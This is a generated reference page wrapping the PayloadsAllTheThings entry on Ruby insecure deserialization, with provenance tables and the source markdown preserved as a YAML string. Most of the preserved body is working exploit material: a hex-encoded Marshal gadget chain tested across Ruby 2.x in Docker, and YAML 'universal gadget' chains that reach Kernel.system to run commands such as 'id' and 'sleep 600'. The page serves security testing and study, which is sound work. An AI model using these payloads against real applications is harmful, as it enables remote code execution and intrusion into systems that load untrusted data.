---
parsed_by: focuslocust
source: payloadsallthethings
type: generated
---
# Ruby Deserialization

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `payloadsallthethings` |
| Type | `payload-topic` |
| Record ID | `patt-insecure-deserialization-ruby` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/Insecure Deserialization/Ruby.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Ruby Deserialization](../../topics/insecure-deserialization/ruby-deserialization.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | patt-insecure-deserialization-ruby |
| name | Ruby Deserialization |
| type | payload-topic |
| source | payloadsallthethings |
| url | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Ruby.md |

## Preserved Source Material

````yaml
_body: "# Ruby Deserialization\n\n> Ruby deserialization is the process of converting serialized data back into Ruby objects,\
  \ often using formats like YAML, Marshal, or JSON. Ruby's Marshal module, for instance, is commonly used for this, as it\
  \ can serialize and deserialize complex Ruby objects.\n\n## Summary\n\n* [Marshal Deserialization](#marshal-deserialization)\n\
  * [YAML Deserialization](#yaml-deserialization)\n* [References](#references)\n\n## Marshal Deserialization\n\nScript to\
  \ generate and verify the deserialization gadget chain against Ruby 2.0 through to 2.5\n\n```ruby\nfor i in {0..5}; do docker\
  \ run -it ruby:2.${i} ruby -e 'Marshal.load([\"0408553a1547656d3a3a526571756972656d656e745b066f3a1847656d3a3a446570656e64656e63794c697374073a0b4073706563735b076f3a1e47656d3a3a536f757263653a3a537065636966696346696c65063a0a40737065636f3a1b47656d3a3a5374756253706563696669636174696f6e083a11406c6f616465645f66726f6d49220d7c696420313e2632063a0645543a0a4064617461303b09306f3b08003a1140646576656c6f706d656e7446\"\
  ].pack(\"H*\")) rescue nil'; done\n```\n\n## YAML Deserialization\n\nVulnerable code\n\n```ruby\nrequire \"yaml\"\nYAML.load(File.read(\"\
  p.yml\"))\n```\n\nUniversal gadget for ruby <= 2.7.2:\n\n```yaml\n--- !ruby/object:Gem::Requirement\nrequirements:\n  !ruby/object:Gem::DependencyList\n\
  \  specs:\n  - !ruby/object:Gem::Source::SpecificFile\n    spec: &1 !ruby/object:Gem::StubSpecification\n      loaded_from:\
  \ \"|id 1>&2\"\n  - !ruby/object:Gem::Source::SpecificFile\n      spec:\n```\n\nUniversal gadget for ruby 2.x - 3.x.\n\n\
  ```yaml\n---\n- !ruby/object:Gem::Installer\n    i: x\n- !ruby/object:Gem::SpecFetcher\n    i: y\n- !ruby/object:Gem::Requirement\n\
  \  requirements:\n    !ruby/object:Gem::Package::TarReader\n    io: &1 !ruby/object:Net::BufferedIO\n      io: &1 !ruby/object:Gem::Package::TarReader::Entry\n\
  \         read: 0\n         header: \"abc\"\n      debug_output: &1 !ruby/object:Net::WriteAdapter\n         socket: &1\
  \ !ruby/object:Gem::RequestSet\n             sets: !ruby/object:Net::WriteAdapter\n                 socket: !ruby/module\
  \ 'Kernel'\n                 method_id: :system\n             git_set: id\n         method_id: :resolve\n```\n\n```yaml\n\
  \ ---\n - !ruby/object:Gem::Installer\n     i: x\n - !ruby/object:Gem::SpecFetcher\n     i: y\n - !ruby/object:Gem::Requirement\n\
  \   requirements:\n     !ruby/object:Gem::Package::TarReader\n     io: &1 !ruby/object:Net::BufferedIO\n       io: &1 !ruby/object:Gem::Package::TarReader::Entry\n\
  \          read: 0\n          header: \"abc\"\n       debug_output: &1 !ruby/object:Net::WriteAdapter\n          socket:\
  \ &1 !ruby/object:Gem::RequestSet\n              sets: !ruby/object:Net::WriteAdapter\n                  socket: !ruby/module\
  \ 'Kernel'\n                  method_id: :system\n              git_set: sleep 600\n          method_id: :resolve \n```\n\
  \n## References\n\n* [Ruby 2.X Universal RCE Deserialization Gadget Chain - Luke Jahnke - November 8, 2018](https://web.archive.org/web/20191128020715/https://www.elttam.com.au/blog/ruby-deserialization/)\n\
  * [Universal RCE with Ruby YAML.load - Etienne Stalmans (@_staaldraad) - March 2, 2019](https://web.archive.org/web/20190302114631/https://staaldraad.github.io/post/2019-03-02-universal-rce-ruby-yaml-load/)\n\
  * [Ruby 2.x Universal RCE Deserialization Gadget Chain - PentesterLab - August 17, 2019](https://web.archive.org/web/20190817140453/https://pentesterlab.com/exercises/ruby_ugadget/course)\n\
  * [Universal RCE with Ruby YAML.load (versions > 2.7) - Etienne Stalmans (@_staaldraad) - January 9, 2021](https://web.archive.org/web/20260201150417/https://staaldraad.github.io/post/2021-01-09-universal-rce-ruby-yaml-load-updated/)\n\
  * [Blind Remote Code Execution through YAML Deserialization - Colin McQueen - June 9, 2021](https://web.archive.org/web/20210610111705/https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/)"
_relative_path: Insecure Deserialization/Ruby.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/Insecure Deserialization/Ruby.md
````
